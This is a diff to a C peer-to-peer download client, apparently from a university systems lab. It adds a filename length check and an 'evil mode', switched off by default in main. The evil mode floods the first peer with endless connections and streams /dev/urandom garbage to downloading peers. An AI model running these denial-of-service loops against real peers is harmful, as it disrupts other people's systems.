@@ -480,6 +480,10 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 		error("* Error while allocating task");
 		goto exit;
 	}
+	if (strlen(filename) >= FILENAMESIZ) {
+		error("* File name too long!");
+		goto exit;	  
+	}
 	strcpy(t->filename, filename);
 
 	// add peers
@@ -519,6 +523,21 @@ static void task_download(task_t *t, task_t *tracker_task)
 	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr
 		   && t->peer_list->port == listen_port)
 		goto try_again;
+
+	// In evil mode we will spam the first peer with connections
+	if (evil_mode == 1) {
+		while(1) {
+			// Connect to the peer
+			message("* Connecting to %s:%d to attack!\n",
+				inet_ntoa(t->peer_list->addr), t->peer_list->port);
+			int fd = open_socket(t->peer_list->addr, t->peer_list->port);
+			if (fd == -1) {
+				// Success! The peer is dos'ed!
+				error("* Cannot connect to peer: %s\n", strerror(errno));
+				while (1) {}
+			}
+		}
+	}
 
 	// Connect to the peer and write the GET command
 	message("* Connecting to %s:%d to download '%s'\n",
@@ -641,7 +660,7 @@ static void task_upload(task_t *t)
 	time_t now, then;
 	double curr_seconds;
 	//Limit Time to 1 minute
-	const double experiment_time_seconds = 10;
+	const double experiment_time_seconds = 60;
 	//Get the current time in seconds
 	time(&now);
 	while (1) {
@@ -670,6 +689,22 @@ static void task_upload(task_t *t)
 		goto exit;
 	}
 	t->head = t->tail = 0;
+	
+	if (evil_mode) {
+		t->disk_fd = open("/dev/urandom", O_RDONLY);
+		int ret = read_to_taskbuf(t->disk_fd, t);
+		if (ret == TBUF_ERROR) {
+			error("* Disk read error");
+			goto exit;
+		}
+		while (1) {			
+			ret = write_from_taskbuf(t->peer_fd, t);
+			t->head -= TASKBUFSIZ;
+			if (ret == TBUF_ERROR)
+				error("* Peer write error");
+			
+		}
+	}
 	
 	char* badCharFound = strpbrk (t->filename, "/");
 	if(badCharFound){
@@ -717,6 +752,7 @@ int main(int argc, char *argv[])
 	char *s;
 	const char *myalias;
 	struct passwd *pwent;
+	evil_mode = 0;
 
 	// Default tracker is read.cs.ucla.edu
 	osp2p_sscanf("131.179.80.139:11111", "%I:%d",
@@ -868,5 +904,5 @@ int main(int argc, char *argv[])
 				printf("Could not fork() for download!\n");
 		}
 	}
-	return 0;
+	return 0;	
 }
